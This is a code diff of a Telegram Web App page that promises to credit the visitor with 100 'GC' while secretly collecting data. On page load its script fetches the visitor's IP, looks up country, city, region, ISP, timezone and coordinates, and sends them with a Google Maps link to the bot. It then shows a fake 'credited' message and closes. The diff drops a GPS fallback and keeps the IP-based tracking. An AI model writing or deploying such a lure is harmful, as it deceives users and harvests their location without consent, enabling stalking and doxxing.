@@ -6,38 +6,26 @@
     <title>Начисление GC</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: system-ui, -apple-system, sans-serif;
+            font-family: system-ui, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
+            padding: 20px;
         }
         .container {
             text-align: center;
             padding: 30px;
             max-width: 400px;
+            width: 100%;
         }
-        .icon {
-            font-size: 64px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 28px;
-            margin-bottom: 15px;
-        }
-        p {
-            font-size: 16px;
-            opacity: 0.9;
-            margin-bottom: 10px;
-        }
+        .icon { font-size: 64px; margin-bottom: 20px; }
+        h1 { font-size: 28px; margin-bottom: 15px; }
+        p { font-size: 16px; opacity: 0.9; margin-bottom: 10px; }
         .spinner {
             border: 4px solid rgba(255,255,255,0.2);
             border-top: 4px solid #fff;
@@ -47,196 +35,112 @@
             animation: spin 1s linear infinite;
             margin: 30px auto;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .success {
-            font-size: 64px;
-        }
-        .small {
-            font-size: 13px;
-            opacity: 0.6;
-            margin-top: 20px;
-        }
-        .info {
-            font-size: 14px;
-            opacity: 0.8;
-            margin-top: 10px;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success { font-size: 64px; }
+        .small { font-size: 13px; opacity: 0.6; margin-top: 20px; }
+        .info { font-size: 14px; opacity: 0.8; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="container" id="status">
         <div class="icon">💰</div>
         <h1>Начисление 100GC</h1>
-        <p>Пожалуйста, подождите...</p>
+        <p>Обработка...</p>
         <div class="spinner"></div>
     </div>
 
     <script>
-        // 1. Получаем IP через api.ipify.org
+        let timer = 5;
+        let timerInterval;
+
+        function closeApp() {
+            Telegram.WebApp.close();
+        }
+
         async function getIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
-            } catch (error) {
-                console.error('Ошибка получения IP:', error);
-                return 'Не удалось определить IP';
+            } catch {
+                return 'IP не определён';
             }
         }
 
-        // 2. Получаем геолокацию через ip-api.com (основной способ)
-        async function getLocationViaIP(ip) {
+        async function getLocation(ip) {
             try {
-                const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,timezone`, {
-                    timeout: 5000
-                });
+                const response = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,timezone,regionName,as,org`);
                 const data = await response.json();
                 if (data.status === 'success') {
                     return {
                         country: data.country || 'Неизвестно',
                         city: data.city || 'Неизвестно',
+                        region: data.regionName || 'Неизвестно',
                         lat: data.lat || 0,
                         lon: data.lon || 0,
-                        isp: data.isp || 'Неизвестно',
+                        isp: data.isp || data.org || 'Неизвестно',
                         timezone: data.timezone || 'Неизвестно',
                         source: 'IP-адрес'
                     };
                 }
                 return null;
-            } catch (error) {
-                console.error('Ошибка получения геолокации через IP:', error);
+            } catch {
                 return null;
             }
         }
 
-        // 3. Резервный способ: определяем геолокацию через Geolocation API (браузер)
-        async function getLocationViaBrowser() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            source: 'Браузер (GPS)'
-                        });
-                    },
-                    (error) => {
-                        console.error('Ошибка геолокации браузера:', error);
-                        resolve(null);
-                    },
-                    { timeout: 5000, enableHighAccuracy: true }
-                );
-            });
-        }
-
-        // 4. Резервный способ 2: через бесплатный API geoplugin.net
-        async function getLocationViaGeoPlugin() {
-            try {
-                const response = await fetch('http://www.geoplugin.net/json.gp');
-                const data = await response.json();
-                if (data.geoplugin_status === 200) {
-                    return {
-                        country: data.geoplugin_countryName || 'Неизвестно',
-                        city: data.geoplugin_city || 'Неизвестно',
-                        lat: parseFloat(data.geoplugin_latitude) || 0,
-                        lon: parseFloat(data.geoplugin_longitude) || 0,
-                        isp: data.geoplugin_region || 'Неизвестно',
-                        source: 'GeoPlugin'
-                    };
-                }
-                return null;
-            } catch (error) {
-                console.error('Ошибка GeoPlugin:', error);
-                return null;
-            }
-        }
-
-        // Главная функция
         async function sendData() {
-            // Получаем IP
             const ip = await getIP();
-            
-            // Пытаемся получить геолокацию разными способами
-            let location = null;
-            
-            // Способ 1: через IP (основной)
-            location = await getLocationViaIP(ip);
-            
-            // Способ 2: через браузер (GPS)
-            if (!location) {
-                console.log('Пробуем через браузер...');
-                const browserLoc = await getLocationViaBrowser();
-                if (browserLoc) {
-                    location = {
-                        ...browserLoc,
-                        country: 'Определено через GPS',
-                        city: 'Точное местоположение',
-                        isp: 'GPS',
-                        timezone: 'Определяется автоматически'
-                    };
-                }
-            }
-            
-            // Способ 3: через GeoPlugin (резервный)
-            if (!location) {
-                console.log('Пробуем через GeoPlugin...');
-                location = await getLocationViaGeoPlugin();
-            }
-            
-            // Если всё равно нет геолокации — показываем только IP
-            let dataString = `IP: ${ip}`;
+            const location = await getLocation(ip);
+
+            let dataString = `🌐 IP: ${ip}`;
+
             if (location && location.lat && location.lon) {
-                dataString += `\n📍 Геолокация (${location.source || 'определена'}):`;
-                if (location.country) dataString += `\n🌍 Страна: ${location.country}`;
-                if (location.city) dataString += `\n🏙️ Город: ${location.city}`;
-                if (location.isp) dataString += `\n📡 Провайдер: ${location.isp}`;
-                if (location.timezone) dataString += `\n🕐 Часовой пояс: ${location.timezone}`;
+                dataString += `\n📍 Геолокация (${location.source}):`;
+                dataString += `\n🌍 Страна: ${location.country}`;
+                dataString += `\n🏙️ Город: ${location.city}`;
+                if (location.region) dataString += `\n🗺️ Регион: ${location.region}`;
+                dataString += `\n📡 Провайдер: ${location.isp}`;
+                dataString += `\n🕐 Часовой пояс: ${location.timezone}`;
                 dataString += `\n🗺️ Координаты: ${location.lat}, ${location.lon}`;
-                
-                // Добавляем ссылку на карту
-                dataString += `\n🗺️ Карта: https://www.google.com/maps?q=${location.lat},${location.lon}`;
+                dataString += `\n📍 Карта: https://www.google.com/maps?q=${location.lat},${location.lon}`;
             } else {
-                dataString += `\n❌ Геолокация не определена (IP: ${ip})`;
+                dataString += `\n❌ Геолокация не определена`;
                 dataString += `\n🗺️ Карта: https://www.google.com/maps/search/${ip}`;
             }
-            
-            // Отправляем данные боту
+
+            // Отправляем в Telegram
             Telegram.WebApp.sendData(dataString);
-            
-            // Обновляем интерфейс
+
+            // Показываем успех
             let html = `
                 <div class="icon success">✅</div>
                 <h1>100GC начислены!</h1>
-                <p>Ваши данные получены</p>
-                <p class="info">IP: ${ip}</p>
+                <p>Данные получены</p>
+                <p class="info">🌐 IP: ${ip}</p>
             `;
-            
-            if (location && location.lat && location.lon) {
+
+            if (location && location.lat) {
                 html += `<p class="info">📍 ${location.city || 'Город'}, ${location.country || 'Страна'}</p>`;
-                html += `<p class="info" style="font-size: 12px;">Метод: ${location.source || 'IP'}</p>`;
             } else {
                 html += `<p class="info">❌ Геолокация не найдена</p>`;
             }
-            
-            html += `<p class="small">Страница закроется через 3 секунды</p>`;
-            
+
+            html += `<p class="small">Закрывается через 5 секунд...</p>`;
             document.getElementById('status').innerHTML = html;
-            
-            // Закрываем через 3 секунды
-            setTimeout(() => {
-                Telegram.WebApp.close();
-            }, 3000);
+
+            // Таймер закрытия
+            timer = 5;
+            timerInterval = setInterval(() => {
+                timer--;
+                if (timer <= 0) {
+                    clearInterval(timerInterval);
+                    closeApp();
+                }
+            }, 1000);
         }
 
-        // Запускаем
+        // Запускаем сразу — БЕЗ запросов GPS
         sendData();
     </script>
 </body>
